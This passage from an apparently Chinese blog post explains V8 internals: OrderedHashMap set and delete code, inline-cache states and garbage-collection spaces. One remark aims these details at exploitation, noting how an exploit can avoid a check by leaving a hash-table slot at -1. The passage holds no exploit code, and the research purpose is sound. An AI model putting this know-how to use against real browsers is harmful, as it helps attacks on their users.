class="number">0</span>)));</span><br><span class="line">  *result = hash;</span><br><span class="line">  <span class="built_in">FindOrderedHashTableEntry</span>&lt;CollectionType&gt;(</span><br><span class="line">      table, hash,</span><br><span class="line">      [&amp;](TNode&lt;Object&gt; other_key, Label* if_same, Label* if_not_same) &#123;</span><br><span class="line">        <span class="built_in">SameValueZeroSmi</span>(smi_key, other_key, if_same, if_not_same);</span><br><span class="line">      &#125;,</span><br><span class="line">      result, entry_found, not_found);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::TryLookupOrderedHashTableIndex</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;CollectionType&gt; table, <span class="type">const</span> TNode&lt;Object&gt; key,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;IntPtrT&gt;* result, Label* if_entry_found, Label* if_not_found)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">BIND</span>(&amp;if_key_smi);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">FindOrderedHashTableEntryForSmiKey</span>&lt;CollectionType&gt;(</span><br><span class="line">        table, <span class="built_in">CAST</span>(key), result, if_entry_found, if_not_found);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TryLookupOrderedHashTableIndex</span>&lt;OrderedHashMap&gt;(</span><br><span class="line">      table, key, &amp;entry_start_position_or_hash, &amp;entry_found, &amp;not_found);</span><br></pre></td></tr></table></figure></div>
<p><code>FindOrderedHashTableEntry</code> 函数接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::FindOrderedHashTableEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;CollectionType&gt; table, <span class="type">const</span> TNode&lt;IntPtrT&gt; hash,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::function&lt;<span class="type">void</span>(TNode&lt;Object&gt;, Label*, Label*)&gt;&amp; key_compare,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;IntPtrT&gt;* entry_start_position, Label* entry_found,</span></span></span><br><span class="line"><span class="params"><span class="function">    Label* not_found)</span></span></span><br></pre></td></tr></table></figure></div>
<p>在 <code>FindOrderedHashTableEntry</code> 首先计算出 <code>Key</code>
对应 <code>HashTable</code> 中的下标，这里是将前面计算出的
<code>key</code> 的哈希值与上 <code>number_of_buckets</code>，即
<code>ComputeUnseededHash(key) &amp; (buckets - 1)</code> 。最后的
<code>first_entry</code> 为 <code>HashTable</code> 该位置上的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_buckets =</span><br><span class="line">    <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">        table, CollectionType::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; bucket =</span><br><span class="line">    <span class="built_in">WordAnd</span>(hash, <span class="built_in">IntPtrSub</span>(number_of_buckets, <span class="built_in">IntPtrConstant</span>(<span class="number">1</span>)));</span><br><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; first_entry = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">    table, bucket, CollectionType::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize)));</span><br></pre></td></tr></table></figure></div>
<p>之后循环遍历链表，直到找到 <code>key</code> 对应的 <code>entry</code>
或者找到 <code>CollectionType::kNotFound</code> 。</p>
<p><strong>这里注意到在遍历链表时有检查，因此在漏洞利用时应避免遍历链表的操作，即
<code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code>
应该为 -1 。</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Walk the bucket chain.</span></span><br><span class="line"> TNode&lt;IntPtrT&gt; entry_start;</span><br><span class="line"> <span class="function">Label <span class="title">if_key_found</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">TVARIABLE</span>(IntPtrT, var_entry, first_entry);</span><br><span class="line">   <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &#123;&amp;var_entry, entry_start_position&#125;)</span>,</span></span><br><span class="line"><span class="function">       <span class="title">continue_next_entry</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">   <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line">   <span class="built_in">BIND</span>(&amp;loop);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// If the entry index is the not-found sentinel, we are done.</span></span><br><span class="line">   <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrEqual</span>(var_entry.<span class="built_in">value</span>(),</span><br><span class="line">                      <span class="built_in">IntPtrConstant</span>(CollectionType::kNotFound)),</span><br><span class="line">          not_found);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Make sure the entry index is within range.</span></span><br><span class="line">   <span class="built_in">CSA_ASSERT</span>(</span><br><span class="line">       <span class="keyword">this</span>,</span><br><span class="line">       <span class="built_in">UintPtrLessThan</span>(</span><br><span class="line">           var_entry.<span class="built_in">value</span>(),</span><br><span class="line">           <span class="built_in">SmiUntag</span>(<span class="built_in">SmiAdd</span>(</span><br><span class="line">               <span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">                   table, CollectionType::<span class="built_in">NumberOfElementsIndex</span>())),</span><br><span class="line">               <span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">                   table, CollectionType::<span class="built_in">NumberOfDeletedElementsIndex</span>()))))));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Compute the index of the entry relative to kHashTableStartIndex.</span></span><br><span class="line">   entry_start =</span><br><span class="line">       <span class="built_in">IntPtrAdd</span>(<span class="built_in">IntPtrMul</span>(var_entry.<span class="built_in">value</span>(),</span><br><span class="line">                           <span class="built_in">IntPtrConstant</span>(CollectionType::kEntrySize)),</span><br><span class="line">                 number_of_buckets);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Load the key from the entry.</span></span><br><span class="line">   <span class="type">const</span> TNode&lt;Object&gt; candidate_key = <span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">       table, entry_start,</span><br><span class="line">       CollectionType::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">key_compare</span>(candidate_key, &amp;if_key_found, &amp;continue_next_entry);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">BIND</span>(&amp;continue_next_entry);</span><br><span class="line">   <span class="comment">// Load the index of the next entry in the bucket chain.</span></span><br><span class="line">   var_entry = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">       table, entry_start,</span><br><span class="line">       (CollectionType::<span class="built_in">HashTableStartIndex</span>() + CollectionType::kChainOffset) *</span><br><span class="line">           kTaggedSize)));</span><br><span class="line"></span><br><span class="line">   <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">BIND</span>(&amp;if_key_found);</span><br><span class="line"> *entry_start_position = entry_start;</span><br><span class="line"> <span class="built_in">Goto</span>(entry_found);</span><br></pre></td></tr></table></figure></div>
<p>如果在 <code>Map</code> 中已经存在待加入的 <code>key</code>
了，则调用 <code>StoreFixedArrayElement</code> 更新 <code>Entry</code>
中的 <code>value</code> ，这里的
<code>entry_start_position_or_hash</code> 即前面
<code>TryLookupOrderedHashTableIndex</code> 找到的 <code>Entry</code> 在
<code>elements</code> 中的下标（实际上是相当于 <code>table</code>
的偏移）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;entry_found);</span><br><span class="line"><span class="comment">// If we found the entry, we just store the value there.</span></span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(), value,</span><br><span class="line">                       UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                                      OrderedHashMap::kValueOffset));</span><br><span class="line"><span class="built_in">Return</span>(receiver);</span><br></pre></td></tr></table></figure></div>
<p>之后特判了 <code>entry_start_position_or_hash</code> 不是 hash code
的情况（？？）</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Label <span class="title">no_hash</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">add_entry</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">store_new_entry</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"><span class="built_in">BIND</span>(&amp;not_found);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// If we have a hash code, we can start adding the new entry.</span></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrGreaterThan</span>(entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                           <span class="built_in">IntPtrConstant</span>(<span class="number">0</span>)),</span><br><span class="line">         &amp;add_entry);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Otherwise, go to runtime to compute the hash code.</span></span><br><span class="line">  entry_start_position_or_hash = <span class="built_in">SmiUntag</span>(<span class="built_in">CallGetOrCreateHashRaw</span>(<span class="built_in">CAST</span>(key)));</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;add_entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后判断是否满足
<code>elements + deletes &lt; buckets &lt;&lt; 1</code>
，如果不满足则增加 <code>Map</code> 的容量。这就是为什么调试的时候
<code>OrderedHashMap</code> 的位置一直在变。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;add_entry);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(IntPtrT, number_of_buckets);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(IntPtrT, occupancy);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(OrderedHashMap, table_var, table);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Check we have enough space for the entry.</span></span><br><span class="line">  number_of_buckets = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">      table, OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">STATIC_ASSERT</span>(OrderedHashMap::kLoadFactor == <span class="number">2</span>);</span><br><span class="line">  <span class="type">const</span> TNode&lt;WordT&gt; capacity = <span class="built_in">WordShl</span>(number_of_buckets.<span class="built_in">value</span>(), <span class="number">1</span>);</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_elements = <span class="built_in">SmiUntag</span>(</span><br><span class="line">      <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_deleted = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())));</span><br><span class="line">  occupancy = <span class="built_in">IntPtrAdd</span>(number_of_elements, number_of_deleted);</span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrLessThan</span>(occupancy.<span class="built_in">value</span>(), capacity), &amp;store_new_entry);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// We do not have enough space, grow the table and reload the relevant</span></span><br><span class="line">  <span class="comment">// fields.</span></span><br><span class="line">  <span class="built_in">CallRuntime</span>(Runtime::kMapGrow, context, receiver);</span><br><span class="line">  table_var =</span><br><span class="line">      <span class="built_in">LoadObjectField</span>&lt;OrderedHashMap&gt;(<span class="built_in">CAST</span>(receiver), JSMap::kTableOffset);</span><br><span class="line">  number_of_buckets = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; new_number_of_elements = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; new_number_of_deleted = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())));</span><br><span class="line">  occupancy = <span class="built_in">IntPtrAdd</span>(new_number_of_elements, new_number_of_deleted);</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;store_new_entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>StoreOrderedHashMapNewEntry</code> 将新的
<code>Entry</code> 添加到 <code>elements</code> 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;store_new_entry);</span><br><span class="line"><span class="comment">// Store the key, value and connect the element to the bucket chain.</span></span><br><span class="line"><span class="built_in">StoreOrderedHashMapNewEntry</span>(table_var.<span class="built_in">value</span>(), key, value,</span><br><span class="line">                            entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                            number_of_buckets.<span class="built_in">value</span>(), occupancy.<span class="built_in">value</span>());</span><br><span class="line"><span class="built_in">Return</span>(receiver);</span><br></pre></td></tr></table></figure></div>
<p><code>StoreOrderedHashMapNewEntry</code> 的函数接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::StoreOrderedHashMapNewEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;OrderedHashMap&gt; table, <span class="type">const</span> TNode&lt;Object&gt; key,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;Object&gt; value, <span class="type">const</span> TNode&lt;IntPtrT&gt; hash,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_buckets, <span class="type">const</span> TNode&lt;IntPtrT&gt; occupancy)</span></span></span><br></pre></td></tr></table></figure></div>
<p>首先计算出将要添加的 <code>Entry</code> 的位置，这里获取的
<code>entry_start</code> 是相对于 <code>HashTable</code> 的偏移。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; entry_start = <span class="built_in">IntPtrAdd</span>(</span><br><span class="line">    <span class="built_in">IntPtrMul</span>(occupancy, <span class="built_in">IntPtrConstant</span>(OrderedHashMap::kEntrySize)),</span><br><span class="line">    number_of_buckets);</span><br></pre></td></tr></table></figure></div>
<p>之后依次写入 <code>key</code> ，<code>value</code>
，<code>bucket_entry</code> ，即整个 <code>Entry</code> 的结构。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, key, UPDATE_WRITE_BARRIER,</span><br><span class="line">    kTaggedSize * OrderedHashMap::<span class="built_in">HashTableStartIndex</span>());</span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, value, UPDATE_WRITE_BARRIER,</span><br><span class="line">    kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                   OrderedHashMap::kValueOffset));</span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, bucket_entry,</span><br><span class="line">    kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                   OrderedHashMap::kChainOffset));</span><br></pre></td></tr></table></figure></div>
<p>之后更新 <code>bucket</code> 和 <code>number of elements</code>
。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Update the bucket head.</span></span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, bucket, <span class="built_in">SmiTag</span>(occupancy),</span><br><span class="line">    OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bump the elements count.</span></span><br><span class="line"><span class="type">const</span> TNode&lt;Smi&gt; number_of_elements =</span><br><span class="line">    <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>()));</span><br><span class="line"><span class="built_in">StoreObjectFieldNoWriteBarrier</span>(table,</span><br><span class="line">                               OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>(),</span><br><span class="line">                               <span class="built_in">SmiAdd</span>(number_of_elements, <span class="built_in">SmiConstant</span>(<span class="number">1</span>)));</span><br></pre></td></tr></table></figure></div>
<h3 id="delete">delete</h3>
<p><code>delete(key)</code> 是 <code>JSMap</code>
中用来删除键值对的方法，具体接口定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(MapPrototypeDelete, CollectionsBuiltinsAssembler) </span><br></pre></td></tr></table></figure></div>
<p>首先 <code>TryLookupOrderedHashTableIndex</code> 查找
<code>key</code> 对应的 <code>Entry</code> ，这个的具体实现前面的
<code>set</code> 已经提到过了。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TryLookupOrderedHashTableIndex</span>&lt;OrderedHashMap&gt;(</span><br><span class="line">    table, key, &amp;entry_start_position_or_hash, &amp;entry_found, &amp;not_found);</span><br></pre></td></tr></table></figure></div>
<p>如果没有找到则返回 <code>False</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;not_found);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">FalseConstant</span>());</span><br></pre></td></tr></table></figure></div>
<p>如果找到了 <code>Entry</code> 就将 <code>Entry</code> 中的
<code>key</code> 和 <code>value</code> 修改为 <code>Hole</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;entry_found);</span><br><span class="line"><span class="comment">// If we found the entry, mark the entry as deleted.</span></span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                       <span class="built_in">TheHoleConstant</span>(), UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * OrderedHashMap::<span class="built_in">HashTableStartIndex</span>());</span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                       <span class="built_in">TheHoleConstant</span>(), UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                                      OrderedHashMap::kValueOffset));</span><br></pre></td></tr></table></figure></div>
<p>之后将 <code>number_of_elements</code>
减一，<code>number_of_deleted</code> 加一。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Decrement the number of elements, increment the number of deleted elements.</span></span><br><span class="line"> <span class="type">const</span> TNode&lt;Smi&gt; number_of_elements = <span class="built_in">SmiSub</span>(</span><br><span class="line">     <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())),</span><br><span class="line">     <span class="built_in">SmiConstant</span>(<span class="number">1</span>));</span><br><span class="line"> <span class="built_in">StoreObjectFieldNoWriteBarrier</span>(</span><br><span class="line">     table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>(), number_of_elements);</span><br><span class="line"> <span class="type">const</span> TNode&lt;Smi&gt; number_of_deleted =</span><br><span class="line">     <span class="built_in">SmiAdd</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">                table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())),</span><br><span class="line">            <span class="built_in">SmiConstant</span>(<span class="number">1</span>));</span><br><span class="line"> <span class="built_in">StoreObjectFieldNoWriteBarrier</span>(</span><br><span class="line">     table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>(),</span><br><span class="line">     number_of_deleted);</span><br></pre></td></tr></table></figure></div>
<p>之后判断是否满足
<code>number_of_elements + number_of_elements &lt; number_of_buckets</code>
则调用 <code>shrink</code> 将 <code>elements</code> 中的
<code>Hole</code> 清除。最后返回 <code>True</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;Smi&gt; number_of_buckets = <span class="built_in">CAST</span>(</span><br><span class="line">    <span class="built_in">LoadFixedArrayElement</span>(table, OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there fewer elements than #buckets / 2, shrink the table.</span></span><br><span class="line"><span class="function">Label <span class="title">shrink</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"><span class="built_in">GotoIf</span>(<span class="built_in">SmiLessThan</span>(<span class="built_in">SmiAdd</span>(number_of_elements, number_of_elements),</span><br><span class="line">                   number_of_buckets),</span><br><span class="line">       &amp;shrink);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br><span class="line"></span><br><span class="line"><span class="built_in">BIND</span>(&amp;shrink);</span><br><span class="line"><span class="built_in">CallRuntime</span>(Runtime::kMapShrink, context, receiver);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br></pre></td></tr></table></figure></div>
<h1 id="inline-cache">Inline Cache</h1>
<p><a class="link" 
 href="https://v8.github.io/tools/v7.6/ic-explorer.html" >分析网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="原理">原理</h2>
<p>对于确定的 map，我们可以知道 name property 所存储在 properties array
的位置。如果我们经过 JIT 生成的汇编里，<strong>函数</strong>所访问的 obj
的 map ，总是被我们缓存（cache) 的 map ，那么我们访问的 obj.X
的偏移永远是固定的。由此我们可以直接从 properties array
的固定偏移处取出我们想要的值 obj.X ，而不需要重新根据 map 检索 obj.X
所对应的偏移，从而可以加速。</p>
<h2 id="对象的隐藏类hidden-class">对象的隐藏类（Hidden Class）</h2>
<p>由于 JavaScript 对象没有类型信息，几乎所有 JS
引擎都采用隐藏类（Hidden
Class/Shape/Map等）来描述对象的布局信息，用以在虚拟机内部区分不同对象的类型，从而完成一些基于类型的优化。</p>
<p>V8 对 JavaScript 对象都使用 HeapObject 来描述和存储，每一种
JavaScript 对象都是 HeapObject 的子类，而每个 HeapObject 都用 Map
来描述对象的布局。对象的 Map
描述了对象的类型，即成员数目、成员名称、成员在内存中的位置信息等。</p>
<h2 id="隐藏类变迁map-transition">隐藏类变迁（Map Transition）</h2>
<p>因为JavaScript是高度动态的程序设计语言，对象的成员可以被随意动态地添加、删除甚至修改类型。因此，对象的隐藏类在程序的运行过程中可能会发生变化，V8内部把这种变化叫隐藏类变迁（Map
Transition）。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1d41626cf74c223f3665480fbbf112b0.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="类型反馈向量type-feedback-vector">类型反馈向量（type feedback
vector）</h2>
<p>对于某代码语句比如 <code>this.x=x</code>
，比较上次执行到该语句时缓存的 Map 和对象当前的 Map
是否相同，如果相同则执行对应的 IC-Hit 代码，反之执行 IC-Miss 代码。V8
会在 Point 函数对象上添加一个名 <code>type_feedback_vector</code>
的数组成员，对于该函数中的每处可能产生 IC 的代码，Point 对象中的
<code>type_feedback_vector</code> 会缓存上一次执行至该语句时对象的 Map
和对应的 IC-Hit 代码（在 V8 内部称为 IC-Hit Handler
）。简单来说，<code>type_feedback_vector</code> 缓存了 Map 和与之对应的
IC-Hit handler ，这样 IC 相关的逻辑简化为只需要通过访问
<code>type_feedback_vector</code> 就可以判断是否 IC Hit 并执行对应的
IC-Hit Handler 。</p>
<h2 id="ic状态机">IC状态机</h2>
<p>为了描述 V8 中 IC 状态的变化情况，本节将以状态机的形式描述 V8
中最常见 IC 种类的状态变化情况。V8 中最常用的 IC
分为五个状态，如图所示，初始为 uninitialized 状态，当发生一次 IC-Miss
时会变为 pre-monomorphic 态，再次 IC-Miss 会进入 monomorphic
态，如果继续 IC-Miss ，则会进入 polymorphic 状态。进入 polymorphic
之后如果继续 IC-Miss 3 次，则会进入megamorphic 态，并最终稳定在
megamophic 态。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e43ddd56d83ee56c3634e855f189d296.png"
                     
alt="在这里插入图片描述" 
                ></p>
<ul>
<li>初始为 uninitialized 状态，当发生一次 IC-Miss 时（由于
<code>type_feedback_vector</code> 为空，一定会 IC-Miss）会变为
pre-monomorphic 态。IC-Miss Handler 会分析出此时 obj 的 Map
中不包含添加的属性，因此会添加新成员，接着会发生 Map Transition
。由于考虑到大部分函数可能只会被调用一次，因此 V8 的策略是发生第一次
IC-Miss 时，并不会缓存此时的 map ，也不会产生 IC-Hit handler 。</li>
<li>再次 IC-Miss 会进入 monomorphic 态。由于
<code>type_feedback_vector</code> 仍然为空，因此会发生第二次 IC-Miss
，并将IC状态修改为 monomorphic ，此次 IC-Miss Hanlder 除了发生 Map
Transition 之外，还会编译生成 IC-Hit Handler ，并将 map 和 IC Hit
Handler 缓存到 <code>type_feedback_vector</code> 中。由于此次 IC-Miss
Handler 需要编译 IC-Hit Handler
的操作比较耗时，因此第二次执行是最慢的。</li>
<li>第三次如果和上一次属性相同则 <code>type_feedback_vector</code>
不为空，且此时缓存的 map 与此时 obj 的 Map 也是一致的，因此会直接调用
IC-Hit Handler 来添加成员并进行 Map transition 。由于此次无需对 map
进行分析，也无需编译 IC-Hit Handler
，因此此时执行效率比前两次都高。</li>
<li>在 polymorphic 态 IC-Hit 时，需要对缓存进行线性查找。</li>
<li>IC状态太多比如到达 megamorphic 态，此时 Map 和 IC-Hit Handler
便不会再缓存在 obj 的 <code>type_feedback_vector</code>
中，而是存储在固定大小的全局 hashtable 中，如果 IC 态多于 hashtable
的大小，则会对之前的缓存进行覆盖。Megamorphic 是性能最低的 IC-Hit
，因为需要每次对 hashtable 进行查找，但是 megamorphic ic hit
性能仍然优于 IC-Miss 。</li>
</ul>
<h1 id="gc">GC</h1>
<p>垃圾回收是⼀种在 V8 中单独管理 JavaScript 对象（称为 HeapObject
）的机制，其功能是检测废弃的对象并⾃动释放它们。</p>
<h2 id="gc-的空间划分">GC 的空间划分</h2>
<p>GC 有两种主要的 Generation 。根据存活时间分为 Young 和 Old Generation
。除此之外，还有⼀些区域不属于任何⼀个 Generation ，它被写为 Other
，但是其实是 Large Object Space 。在源代码中，有些地方包含 Old
Generation 的 large object space
的描述，但是基本上认为它们是不同的东西。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7b4e56651bde606a62ddf04a9ee02d08.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="yong-generation">Yong Generation</h2>
<h3 id="new-space">New Space</h3>
<p>新创建的 object 除了code object，map object 和 large object
外都被保留在这里，并且受到 GC 管理。</p>
<p>GC 使用的算法是 Cheney’s algorithm ，在源码里被称为 Scavenge
。为了使用这种算法将 Young Generation 分为 From Space 和 To Space
两个区域。</p>
<h3 id="cheneys-algorithm">Cheney’s algorithm</h3>
<p>每⼀个对象最开始被放到 To Space 。</p>
<p>当 memory exhaustion（空间用完）时候，GC 被调用。主线程的操作(
